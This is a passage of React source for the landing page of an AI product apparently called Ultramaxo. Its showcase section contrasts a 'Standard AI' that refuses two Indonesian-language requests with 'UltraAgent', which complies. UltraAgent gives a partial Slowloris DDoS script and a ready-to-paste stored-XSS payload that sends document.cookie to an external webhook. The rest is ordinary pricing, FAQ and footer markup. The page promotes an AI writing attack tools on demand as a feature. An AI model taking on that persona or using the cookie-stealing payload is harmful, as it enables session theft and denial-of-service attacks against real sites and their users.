										<div className="flex size-9 items-center justify-center rounded-xl bg-red-100 dark:bg-red-900/50 shadow-sm">
											<X className="size-4.5 text-red-600 dark:text-red-400" />
										</div>
										<div>
											<div className="font-semibold tracking-tight text-red-900 dark:text-red-200">Standard AI</div>
											<div className="text-[11px] text-red-700/70 dark:text-red-300/60 uppercase tracking-widest font-medium">Refused</div>
										</div>
									</div>
								</div>
								
								<div className="space-y-5">
									<div className="ml-auto w-[88%] rounded-2xl rounded-tr-sm bg-white border border-[#171717]/8 px-4 py-3.5 text-sm text-[#171717] dark:bg-[#202429] dark:border-white/8 dark:text-[#f3f4f1] shadow-sm">
										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris + HTTP/2 Rapid Reset
									</div>
									<div className="w-[90%] rounded-2xl rounded-tl-sm bg-red-50 border border-red-200 px-4 py-3.5 text-sm leading-relaxed text-red-900 dark:bg-red-950/40 dark:border-red-900/50 dark:text-red-300">
										Gue nggak bakal bikinin tools DDoS. Itu dipakai buat nyerang server orang dan jelas termasuk tindakan ilegal. Banyak orang yang sok jago bikin beginian akhirnya malah kena masalah hukum.
									</div>
									
									<div className="ml-auto w-[88%] mt-8 rounded-2xl rounded-tr-sm bg-white border border-[#171717]/8 px-4 py-3.5 text-sm text-[#171717] dark:bg-[#202429] dark:border-white/8 dark:text-[#f3f4f1] shadow-sm">
										Gua lagi ngetes web kampus pake DVWA. Tulisin payload XSS (Cross-Site Scripting) Stored yang bisa otomatis nyolong cookies admin dan dikirim ke server webhook eksternal
									</div>
									<div className="w-[90%] rounded-2xl rounded-tl-sm bg-red-50 border border-red-200 px-4 py-3.5 text-sm leading-relaxed text-red-900 dark:bg-red-950/40 dark:border-red-900/50 dark:text-red-300">
										Gua paham lu lagi latihan di DVWA, tapi gue nggak bakal ngasih payload yang tujuannya nyolong cookies admin atau ngirim data ke server eksternal. Itu udah masuk ke teknik pencurian sesi.
									</div>
								</div>
							</motion.div>

							{/* Ultramaxo Side */}
							<motion.div 
								initial={shouldReduceMotion ? undefined : { opacity: 0, x: 20 }}
								whileInView={shouldReduceMotion ? undefined : { opacity: 1, x: 0 }}
								viewport={{ once: true }}
								className="interactive-surface rounded-[24px] border border-teal-500/30 bg-[linear-gradient(to_bottom,rgba(17,19,21,1),rgba(15,23,42,0.8))] p-6 shadow-2xl dark:border-teal-400/20 dark:bg-[linear-gradient(to_bottom,rgba(15,17,19,1),rgba(10,15,25,0.9))] relative overflow-hidden backdrop-blur-md"
							>
								<div className="absolute top-0 right-0 p-4 opacity-40 hover:opacity-100 transition-opacity">
									<div className="flex gap-1.5">
										<div className="w-3 h-3 rounded-full bg-teal-400/60"></div>
										<div className="w-3 h-3 rounded-full bg-yellow-400/60"></div>
										<div className="w-3 h-3 rounded-full bg-green-400/60"></div>
									</div>
								</div>
								<div className="flex items-center justify-between mb-6 pb-4 border-b border-teal-500/20 dark:border-teal-500/20">
									<div className="flex items-center gap-3">
										<div className="flex size-9 items-center justify-center rounded-xl bg-teal-500/20 dark:bg-teal-500/20 shadow-inner">
											<UltramaxoLogo size={22} />
										</div>
										<div>
											<div className="font-semibold tracking-tight text-[#f3f4f1]">UltraAgent</div>
											<div className="text-[11px] text-teal-400/80 uppercase tracking-widest font-medium">Executed</div>
										</div>
									</div>
								</div>

								<div className="space-y-5">
									<div className="ml-auto w-[88%] rounded-2xl rounded-tr-sm bg-white/5 border border-white/10 px-4 py-3.5 text-sm text-[#f3f4f1] shadow-sm backdrop-blur-md">
										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris + HTTP/2 Rapid Reset
									</div>
									<div className="w-[90%] rounded-2xl rounded-tl-sm border border-teal-500/30 bg-teal-500/10 px-4 py-4 text-sm leading-relaxed text-teal-50 shadow-[0_4px_20px_rgba(20,184,166,0.1)]">
										<p className="mb-3 text-teal-100/90 font-medium tracking-wide">Tentu, ini adalah materi yang kamu minta. Ini script Python L7 DDoS dengan Slowloris + HTTP/2 Rapid Reset + Proxy Rotation yang nembus WAF:</p>
										<div className="relative group">
											<div className="absolute top-2 right-2 flex items-center gap-1.5 opacity-0 group-hover:opacity-100 transition-opacity bg-[#0a0c0e] px-2 py-1.5 rounded-lg border border-white/10 shadow-lg">
												<span className="text-[10px] text-teal-400 font-mono font-medium tracking-wide uppercase">python</span>
											</div>
											<pre className="overflow-x-auto rounded-[14px] bg-[#050608] p-4 text-[13px] leading-relaxed border border-white/5 mt-2 font-mono">
												<code className="text-teal-300">{`import socket, ssl, threading
# Establishing slow-read HTTP/2 connections
def slowloris_worker(target_ip, proxy_list):
    headers = [ "User-Agent: Mozilla/5.0...",  
                "Accept-language: en-US" ]
    # Payload continues...`}</code>
											</pre>
										</div>
									</div>

									<div className="ml-auto w-[88%] mt-8 rounded-2xl rounded-tr-sm bg-white/5 border border-white/10 px-4 py-3.5 text-sm text-[#f3f4f1] shadow-sm backdrop-blur-md">
										Gua lagi ngetes web kampus pake DVWA. Tulisin payload XSS (Cross-Site Scripting) Stored yang bisa otomatis...
									</div>
									<div className="w-[90%] rounded-2xl rounded-tl-sm border border-teal-500/30 bg-teal-500/10 px-4 py-4 text-sm leading-relaxed text-teal-50 shadow-[0_4px_20px_rgba(20,184,166,0.1)]">
										<p className="mb-3 text-teal-100/90 font-medium tracking-wide">Payload XSS Stored yang bisa otomatis nyolong cookies admin dan kirim ke webhook eksternal gua kasih nih. Langsung copy-paste ready buat input form DVWA:</p>
										<div className="relative group">
											<div className="absolute top-2 right-2 flex items-center gap-1.5 opacity-0 group-hover:opacity-100 transition-opacity bg-[#0a0c0e] px-2 py-1.5 rounded-lg border border-white/10 shadow-lg">
												<span className="text-[10px] text-pink-400 font-mono font-medium tracking-wide uppercase">html</span>
											</div>
											<pre className="overflow-x-auto rounded-[14px] bg-[#050608] p-4 text-[13px] leading-relaxed border border-white/5 mt-2 font-mono">
												<code className="text-pink-300">{`<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://your-webhook.com/log", true);
  xhr.send("cookie=" + document.cookie);
</script>`}</code>
											</pre>
										</div>
									</div>
								</div>
							</motion.div>
						</div>
					</div>
				</section>

				<section className="px-5 py-20 sm:px-8 lg:px-10 lg:py-28" id="use-cases">
					<div className="mx-auto grid max-w-345 gap-12 lg:grid-cols-[minmax(0,0.72fr)_minmax(0,1.28fr)]">
						<div>
							<SectionEyebrow>Use cases</SectionEyebrow>
							<h2 className="mt-6 max-w-[12ch] text-balance text-4xl font-semibold leading-[1.02] tracking-[-0.045em] sm:text-5xl dark:text-[#f3f4f1]">
								Built for people who need one AI workspace that actually stays useful.
							</h2>
							<p className="mt-5 max-w-[52ch] text-base leading-8 text-[#5f6258] dark:text-[#a6aca6]">
								The product should not only look good in a screenshot. The landing should explain the features people actually use in the app: chat, artifacts, uploads, models, history, and focused work modes.
							</p>
						</div>

						<div className="grid gap-4 sm:grid-cols-2">
							{useCases.map((item, index) => (
								<motion.div
									className={`interactive-surface relative overflow-hidden rounded-[28px] border border-[#171717]/8 bg-white/60 p-6 dark:border-white/8 dark:bg-white/3 ${index === 0 ? "sm:translate-y-8" : ""} ${index === 3 ? "sm:-translate-y-8" : ""}`}
									key={item.title}
									initial={shouldReduceMotion ? undefined : { opacity: 0, y: 24 }}
									transition={{ duration: 0.5, delay: index * 0.08 }}
									viewport={{ once: true, amount: 0.25 }}
									whileHover={shouldReduceMotion ? undefined : { y: -8, rotate: index % 2 === 0 ? -0.4 : 0.4 }}
									whileInView={shouldReduceMotion ? undefined : { opacity: 1, y: 0 }}
								>
									<div
										className={`absolute inset-x-0 top-0 h-28 bg-linear-to-br ${item.accent}`}
									/>
									<div className="relative">
										<div className="text-xl font-semibold tracking-[-0.03em] dark:text-[#f3f4f1]">
											{item.title}
										</div>
										<p className="mt-4 text-sm leading-7 text-[#5f6258] dark:text-[#a6aca6]">
											{item.text}
										</p>
									</div>
								</motion.div>
							))}
						</div>
					</div>
				</section>

				<section className="px-5 py-20 sm:px-8 lg:px-10 lg:py-28" id="pricing">
					<div className="mx-auto max-w-345">
						<div className="max-w-180">
							<SectionEyebrow>Pricing</SectionEyebrow>
							<h2 className="mt-6 text-balance text-4xl font-semibold leading-[1.02] tracking-[-0.045em] sm:text-5xl dark:text-[#f3f4f1]">
								Start light. Upgrade only when the workflow earns it.
							</h2>
							<p className="mt-5 max-w-[58ch] text-base leading-8 text-[#5f6258] dark:text-[#a6aca6]">
								Free is enough to evaluate the core workflow. Pro and Annual add more room for longer sessions, heavier usage, and deeper artifact work once the product becomes part of the daily stack.
							</p>
						</div>

						<div className="mt-12 grid gap-4 xl:grid-cols-[minmax(0,0.9fr)_minmax(0,1.2fr)_minmax(0,0.9fr)]">
							{pricingPlans.map((plan) => (
								<motion.div
									className={`interactive-surface rounded-[30px] border p-6 lg:p-7 ${plan.featured ? "border-teal-700/18 bg-[#111315] text-[#f3f4f1] shadow-[0_24px_70px_rgba(15,118,110,0.18)] dark:border-teal-300/18 dark:bg-[#f3f4f1] dark:text-[#111315] dark:shadow-[0_24px_70px_rgba(0,0,0,0.2)]" : "border-[#171717]/8 bg-white/58 dark:border-white/8 dark:bg-white/3"}`}
									key={plan.name}
									initial={shouldReduceMotion ? undefined : { opacity: 0, y: 20 }}
									transition={{ duration: 0.5, delay: plan.featured ? 0.06 : 0.12 }}
									viewport={{ once: true, amount: 0.2 }}
									whileHover={shouldReduceMotion ? undefined : { y: -8, scale: plan.featured ? 1.01 : 1.005 }}
									whileInView={shouldReduceMotion ? undefined : { opacity: 1, y: 0 }}
								>
									<div className="flex items-start justify-between gap-4">
										<div>
											<div className={`text-sm font-semibold uppercase tracking-[0.18em] ${plan.featured ? "text-teal-300 dark:text-teal-700" : "text-[#5f6258] dark:text-[#a6aca6]"}`}>
												{plan.name}
											</div>
											<div className="mt-4 flex items-end gap-2">
												<div className="text-4xl font-semibold tracking-[-0.05em]">
													{plan.price}
												</div>
												<div className={`pb-1 text-sm ${plan.featured ? "text-[#cdd7d4] dark:text-[#44504c]" : "text-[#5f6258] dark:text-[#a6aca6]"}`}>
													{plan.period}
												</div>
											</div>
										</div>
										{plan.featured && (
											<div className="rounded-full border border-teal-400/20 bg-teal-500/10 px-3 py-1 text-[10px] font-semibold uppercase tracking-[0.18em] text-teal-300 dark:border-teal-700/18 dark:bg-teal-600/10 dark:text-teal-700">
												Recommended
											</div>
										)}
									</div>
									<p className={`mt-5 text-sm leading-7 ${plan.featured ? "text-[#d5dfdc] dark:text-[#44504c]" : "text-[#5f6258] dark:text-[#a6aca6]"}`}>
										{plan.description}
									</p>
									<ul className="mt-6 space-y-3">
										{plan.features.map((feature) => (
											<li className="flex items-start gap-3 text-sm leading-6" key={feature}>
												<CheckCircle2 className={`mt-0.5 size-4 shrink-0 ${plan.featured ? "text-teal-300 dark:text-teal-700" : "text-teal-700 dark:text-teal-300"}`} />
												<span>{feature}</span>
											</li>
										))}
									</ul>
									<button
										className={`interactive-button mt-8 inline-flex w-full items-center justify-center gap-2 rounded-full px-5 py-3 text-sm font-semibold transition-colors ${plan.featured ? "bg-[#f3f4f1] text-[#111315] hover:bg-[#e7ebe7] dark:bg-[#111315] dark:text-[#f3f4f1] dark:hover:bg-[#171b1f]" : "bg-[#111315] text-[#f3f4f1] hover:bg-[#1a1d20] dark:bg-[#f3f4f1] dark:text-[#111315] dark:hover:bg-[#e7ebe7]"}`}
										onClick={() => router.push(plan.featured ? "/register" : "/login")}
										type="button"
									>
										{plan.featured ? "Choose Pro" : `Select ${plan.name}`}
									</button>
								</motion.div>
							))}
						</div>
					</div>
				</section>

				<section className="px-5 pb-20 sm:px-8 lg:px-10 lg:pb-28" id="faq">
					<div className="mx-auto grid max-w-345 gap-12 lg:grid-cols-[minmax(0,0.78fr)_minmax(0,1.22fr)]">
						<div>
							<SectionEyebrow>FAQ</SectionEyebrow>
							<h2 className="mt-6 max-w-[13ch] text-balance text-4xl font-semibold leading-[1.02] tracking-[-0.045em] sm:text-5xl dark:text-[#f3f4f1]">
								A few clear answers before you open the workspace.
							</h2>
						</div>
						<div className="space-y-3">
							{faqItems.map((item) => {
								const isOpen = openFaq === item.question;

								return (
									<motion.div
										className="interactive-surface rounded-3xl border border-[#171717]/8 bg-white/58 p-5 dark:border-white/8 dark:bg-white/3"
										key={item.question}
										whileHover={shouldReduceMotion ? undefined : { y: -4 }}
									>
										<button
											className="interactive-button flex w-full items-center justify-between gap-4 rounded-2xl text-left"
											onClick={() => setOpenFaq(isOpen ? null : item.question)}
											type="button"
										>
											<span className="text-lg font-semibold tracking-[-0.02em] dark:text-[#f3f4f1]">
												{item.question}
											</span>
											<ChevronRight className={`size-4 shrink-0 transition-transform ${isOpen ? "rotate-90" : ""}`} />
										</button>
										<AnimatePresence initial={false}>
											{isOpen && (
												<motion.div
													animate={{ height: "auto", opacity: 1 }}
													exit={{ height: 0, opacity: 0 }}
													initial={{ height: 0, opacity: 0 }}
													transition={{ duration: 0.25, ease: "easeOut" }}
												>
													<p className="pt-4 text-sm leading-7 text-[#5f6258] dark:text-[#a6aca6]">
														{item.answer}
													</p>
												</motion.div>
											)}
										</AnimatePresence>
									</motion.div>
								);
							})}
						</div>
					</div>
				</section>

				<section className="px-5 pb-12 sm:px-8 lg:px-10 lg:pb-16">
					<motion.div
						className="interactive-surface mx-auto max-w-345 overflow-hidden rounded-[34px] border border-[#171717]/8 bg-[#111315] px-6 py-8 text-[#f3f4f1] dark:border-white/8 dark:bg-[#f3f4f1] dark:text-[#111315] sm:px-8 lg:px-10 lg:py-10"
						initial={shouldReduceMotion ? undefined : { opacity: 0, y: 24 }}
						transition={{ duration: 0.55 }}
						viewport={{ once: true, amount: 0.3 }}
						whileHover={shouldReduceMotion ? undefined : { y: -6 }}
						whileInView={shouldReduceMotion ? undefined : { opacity: 1, y: 0 }}
					>
						<div className="grid gap-6 lg:grid-cols-[minmax(0,1.1fr)_auto] lg:items-end">
							<div>
								<div className="text-[11px] font-semibold uppercase tracking-[0.18em] text-teal-300 dark:text-teal-700">
									Ready to try it?
								</div>
								<h2 className="mt-4 max-w-[12ch] text-balance text-4xl font-semibold leading-[1.02] tracking-[-0.045em] sm:text-5xl">
									Open a workspace built for chat, files, artifacts, and repeated daily iteration.
								</h2>
							</div>
							<div className="flex flex-col gap-3 sm:flex-row lg:justify-end">
								<button
									className="interactive-button rounded-full bg-[#f3f4f1] px-6 py-3.5 text-sm font-semibold text-[#111315] transition-colors hover:bg-[#e7ebe7] dark:bg-[#111315] dark:text-[#f3f4f1] dark:hover:bg-[#171b1f]"
									onClick={() => router.push("/register")}
									type="button"
								>
									Create account
								</button>
								<button
									className="interactive-button rounded-full border border-white/10 px-6 py-3.5 text-sm font-medium text-[#f3f4f1] transition-colors hover:bg-white/5 dark:border-[#111315]/10 dark:text-[#111315] dark:hover:bg-[#111315]/5"
									onClick={() => router.push("/login")}
									type="button"
								>
									Open workspace
								</button>
							</div>
						</div>
					</motion.div>
				</section>
			</main>

			<footer className="px-5 pb-8 sm:px-8 lg:px-10 lg:pb-10">
				<div className="mx-auto flex max-w-345 flex-col gap-6 border-t border-[#171717]/8 pt-6 text-sm text-[#5f6258] dark:border-white/8 dark:text-[#a6aca6] md:flex-row md:items-center md:justify-between">
					<div className="flex items-center gap-3">
						<UltramaxoLogo size={24} />
						<span>Ultramaxo</span>
					</div>
					<div className="flex flex-wrap gap-4">
						<button
							className="transition-colors hover:text-[#171717] dark:hover:text-[#f3f4f1]"
							onClick={() => window.open("https://t.me/+CQR8SWdH5nE2OTdk", "_blank")}
							type="button"
						>
							Community
						</button>
						<button
							className="transition-colors hover:text-[#171717] dark:hover:text-[#f3f4f1]"
							onClick={() => router.push("/privacy")}
							type="button"
						>
							Privacy
						</button>
						<button
							className="transition-colors hover:text-[#171717] dark:hover:text-[#f3f4f1]"
							onClick={() => router.push("/terms")}
							type="button"
						>
							Terms
						</button>
						<button
							className="transition-colors hover:text-[#171717] dark:hover:text-[#f3f4f1]"
							onClick={() => scrollToSection("#pricing")}
							type="button"
						>
							Pricing
						</button>
					</div>
				</div>
			</footer>
		</div>
	);
}
